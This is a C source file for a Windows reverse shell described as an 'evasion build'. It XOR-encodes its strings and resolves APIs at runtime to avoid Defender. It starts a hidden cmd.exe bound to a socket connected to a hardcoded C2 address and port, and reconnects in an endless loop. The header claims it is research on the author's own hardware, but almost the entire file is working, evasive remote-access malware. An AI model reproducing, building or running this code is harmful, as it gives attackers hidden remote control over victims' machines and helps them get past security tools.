/*
 * cheyanne_shell.c — Reverse Shell (Evasion Build)
 * 22DIV / george wu — CSEC research, own hardware only
 *
 * v2: Dynamic API resolution + XOR banner + stripped static strings.
 * v1 caught by Defender cloud update mid-session.
 */

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>

/* ws2_32 loaded dynamically — no static link */

#define XK 0xFC
#define C2_PORT 4443
#define RECONN  5000

static void xd(unsigned char *buf, const unsigned char *enc, int len) {
    int i; for (i = 0; i < len; i++) buf[i] = enc[i] ^ XK; buf[len] = 0;
}
static void sz(void *p, int len) {
    volatile char *v = (volatile char *)p; int i; for (i = 0; i < len; i++) v[i] = 0;
}

/* "cmd.exe" XOR 0xFC */
static const unsigned char xCmd[] = {0x9F,0x91,0x98,0xD2,0x99,0x84,0x99};
#define xCmd_LEN 7

/* "192.168.1.92" XOR 0xFC */
static const unsigned char xC2[] = {0xCD,0xC5,0xCE,0xD2,0xCD,0xCA,0xC4,0xD2,0xCD,0xD2,0xC5,0xCE};
#define xC2_LEN 12

/* kernel32.dll */
static const unsigned char xK32[] = {
    0x97,0x99,0x8e,0x92,0x99,0x90,0xcf,0xce,0xd2,0x98,0x90,0x90
};
#define xK32_LEN 12

/* ws2_32.dll */
static const unsigned char xWs2[] = {
    0x8b,0x8f,0xce,0xa3,0xcf,0xce,0xd2,0x98,0x90,0x90
};
#define xWs2_LEN 10

/* API names */
static const unsigned char xCPA[] = {
    0xbf,0x8e,0x99,0x9d,0x88,0x99,0xac,0x8e,0x93,0x9f,0x99,0x8f,0x8f,0xbd
};
#define xCPA_LEN 14

static const unsigned char xWFSO[] = {
    0xab,0x9d,0x95,0x88,0xba,0x93,0x8e,0xaf,0x95,0x92,0x9b,0x90,0x99,0xb3,0x9e,0x96,0x99,0x9f,0x88
};
#define xWFSO_LEN 19

static const unsigned char xCH[] = {
    0xbf,0x90,0x93,0x8f,0x99,0xb4,0x9d,0x92,0x98,0x90,0x99
};
#define xCH_LEN 11

static const unsigned char xWSASock[] = {
    0xab,0xaf,0xbd,0xaf,0x93,0x9f,0x97,0x99,0x88,0xbd
};
#define xWSASock_LEN 10

static const unsigned char xWSAConn[] = {
    0xab,0xaf,0xbd,0xbf,0x93,0x92,0x92,0x99,0x9f,0x88
};
#define xWSAConn_LEN 10

static const unsigned char xCloseSock[] = {
    0x9f,0x90,0x93,0x8f,0x99,0x8f,0x93,0x9f,0x97,0x99,0x88
};
#define xCloseSock_LEN 11

static const unsigned char xInetAddr[] = {
    0x95,0x92,0x99,0x88,0xa3,0x9d,0x98,0x98,0x8e
};
#define xInetAddr_LEN 9

static const unsigned char xHtons[] = {0x94,0x88,0x93,0x92,0x8f};
#define xHtons_LEN 5

static const unsigned char xSendFn[] = {0x8f,0x99,0x92,0x98};
#define xSendFn_LEN 4

static const unsigned char xWSAStart[] = {
    0xab,0xaf,0xbd,0xaf,0x88,0x9d,0x8e,0x88,0x89,0x8c
};
#define xWSAStart_LEN 10

static const unsigned char xWSAClean[] = {
    0xab,0xaf,0xbd,0xbf,0x90,0x99,0x9d,0x92,0x89,0x8c
};
#define xWSAClean_LEN 10

static const unsigned char xSleepFn[] = {0xaf,0x90,0x99,0x99,0x8c};
#define xSleepFn_LEN 5

/* getaddrinfo — for DNS resolution */
static const unsigned char xGetAddr[] = {
    0x9b,0x99,0x88,0x9d,0x98,0x98,0x8e,0x95,0x92,0x9a,0x93
};
#define xGetAddr_LEN 11

/* freeaddrinfo */
static const unsigned char xFreeAddr[] = {
    0x9a,0x8e,0x99,0x99,0x9d,0x98,0x98,0x8e,0x95,0x92,0x9a,0x93
};
#define xFreeAddr_LEN 12

/* Function pointer types */
typedef BOOL (WINAPI *fn_CreateProcessA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *fn_WaitForSingleObject)(HANDLE,DWORD);
typedef BOOL (WINAPI *fn_CloseHandle)(HANDLE);
typedef SOCKET (WINAPI *fn_WSASocketA)(int,int,int,LPWSAPROTOCOL_INFOA,GROUP,DWORD);
typedef int (WINAPI *fn_WSAConnect)(SOCKET,const struct sockaddr*,int,
    LPWSABUF,LPWSABUF,LPQOS,LPQOS);
typedef int (WINAPI *fn_closesocket)(SOCKET);
typedef unsigned long (WINAPI *fn_inet_addr)(const char*);
typedef u_short (WINAPI *fn_htons)(u_short);
typedef int (WINAPI *fn_send)(SOCKET,const char*,int,int);
typedef int (WINAPI *fn_WSAStartup)(WORD,LPWSADATA);
typedef int (WINAPI *fn_WSACleanup)(void);
typedef void (WINAPI *fn_Sleep)(DWORD);
typedef int (WINAPI *fn_getaddrinfo)(const char*,const char*,const struct addrinfo*,struct addrinfo**);
typedef void (WINAPI *fn_freeaddrinfo)(struct addrinfo*);

static fn_CreateProcessA     pCPA = NULL;
static fn_WaitForSingleObject pWFSO = NULL;
static fn_CloseHandle        pCH = NULL;
static fn_WSASocketA         pWSASock = NULL;
static fn_WSAConnect         pWSAConn = NULL;
static fn_closesocket        pClose = NULL;
static fn_inet_addr          pInet = NULL;
static fn_htons              pHtons = NULL;
static fn_send               pSend = NULL;
static fn_WSAStartup         pWSAStart = NULL;
static fn_WSACleanup         pWSAClean = NULL;
static fn_Sleep              pSleep = NULL;
static fn_getaddrinfo        pGetAddr = NULL;
static fn_freeaddrinfo       pFreeAddr = NULL;

static BOOL resolve_apis(void) {
    HMODULE hK, hW;
    unsigned char buf[64];

    xd((unsigned char*)buf, xK32, xK32_LEN);
    hK = GetModuleHandleA(buf); sz(buf, sizeof(buf));
    if (!hK) return FALSE;

    xd((unsigned char*)buf, xWs2, xWs2_LEN);
    hW = LoadLibraryA(buf); sz(buf, sizeof(buf));
    if (!hW) return FALSE;

#define R(h,var,enc,elen) do { xd((unsigned char*)buf,enc,elen); var=(void*)GetProcAddress(h,buf); sz(buf,sizeof(buf)); } while(0)
    R(hK, pCPA, xCPA, xCPA_LEN);
    R(hK, pWFSO, xWFSO, xWFSO_LEN);
    R(hK, pCH, xCH, xCH_LEN);
    R(hK, pSleep, xSleepFn, xSleepFn_LEN);
    R(hW, pWSASock, xWSASock, xWSASock_LEN);
    R(hW, pWSAConn, xWSAConn, xWSAConn_LEN);
    R(hW, pClose, xCloseSock, xCloseSock_LEN);
    R(hW, pInet, xInetAddr, xInetAddr_LEN);
    R(hW, pHtons, xHtons, xHtons_LEN);
    R(hW, pSend, xSendFn, xSendFn_LEN);
    R(hW, pWSAStart, xWSAStart, xWSAStart_LEN);
    R(hW, pWSAClean, xWSAClean, xWSAClean_LEN);
    R(hW, pGetAddr, xGetAddr, xGetAddr_LEN);
    R(hW, pFreeAddr, xFreeAddr, xFreeAddr_LEN);
#undef R

    return (pCPA && pWFSO && pCH && pWSASock && pWSAConn && pClose &&
            pInet && pHtons && pSend && pWSAStart && pWSAClean && pSleep &&
            pGetAddr && pFreeAddr);
}

static unsigned long resolve_host(const char *host) {
    unsigned long addr = pInet(host);
    if (addr != INADDR_NONE) return addr;
    /* not an IP — try DNS */
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (pGetAddr(host, NULL, &hints, &res) == 0 && res) {
        addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr.s_addr;
        pFreeAddr(res);
        return addr;
    }
    return INADDR_NONE;
}

static SOCKET dial(const char *host, int port) {
    SOCKET s;
    struct sockaddr_in sa;
    unsigned long addr = resolve_host(host);
    if (addr == INADDR_NONE) return INVALID_SOCKET;
    s = pWSASock(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;
    sa.sin_family = AF_INET;
    sa.sin_port = pHtons((unsigned short)port);
    sa.sin_addr.s_addr = addr;
    if (pWSAConn(s, (struct sockaddr*)&sa, sizeof(sa), NULL, NULL, NULL, NULL) != 0) {
        pClose(s);
        return INVALID_SOCKET;
    }
    return s;
}

static void exec_shell(SOCKET s) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned char cmd[16];
    xd(cmd, xCmd, xCmd_LEN);
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError = (HANDLE)s;
    pCPA(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    sz(cmd, sizeof(cmd));
    pWFSO(pi.hProcess, INFINITE);
    pCH(pi.hProcess);
    pCH(pi.hThread);
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpCmd, int nS) {
    WSADATA wd;
    SOCKET ch;
    char ip[64];
    int port = C2_PORT;
    unsigned char ib[64];

    (void)hI; (void)hP; (void)nS;
    if (!resolve_apis()) return 1;

    if (lpCmd && lpCmd[0]) {
        ip[0] = 0;
        sscanf(lpCmd, "%63s %d", ip, &port);
    }
    if (!lpCmd || !lpCmd[0] || !ip[0]) {
        xd(ib, xC2, xC2_LEN);
        strncpy(ip, (char*)ib, sizeof(ip)-1);
        ip[sizeof(ip)-1] = 0;
        sz(ib, sizeof(ib));
    }

    if (pWSAStart(MAKEWORD(2,2), &wd) != 0) return 1;

    for (;;) {
        ch = dial(ip, port);
        if (ch != INVALID_SOCKET) {
            exec_shell(ch);
            pClose(ch);
        }
        pSleep(RECONN);
    }

    pWSAClean();
    return 0;
}
